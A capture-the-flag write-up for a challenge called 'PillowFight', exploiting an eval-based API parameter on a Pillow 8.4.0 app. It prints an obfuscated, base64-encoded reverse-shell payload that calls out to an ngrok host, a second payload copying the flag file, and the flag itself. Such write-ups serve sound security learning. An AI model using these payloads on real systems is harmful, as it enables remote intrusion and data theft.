# PillowFight



## My Solution



We can see that the app is using Python Pillow 8.4.0 which we know has an exploit where we could execute code because it would be passing it to an eval statement (CVE-2022-22817):  



We also have access to the API docs which unlike the functionality on the main page, takes an additional argument of "eval_command"... very handy, we don't even need the vulnerable Pillow I guess:  



Within that eval_command argument we can pass a payload like this to get a reverse shell:  

```python
__import__('os').system("echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMC50Y3AuZXUubmdyb2suaW8vMTU4NzUgIDA+JjE=|base64 -d|bash")
```


Or, because there is no curl, wget or netcat:  



We could make a static folder and copy the flag there:  

```python
__import__('os').system("mkdir static && cp flag.txt static/")
```



Either way, we get the flag.

`flag{b6b62e6c5cdfda3b3a8b87d90fd48d01}`
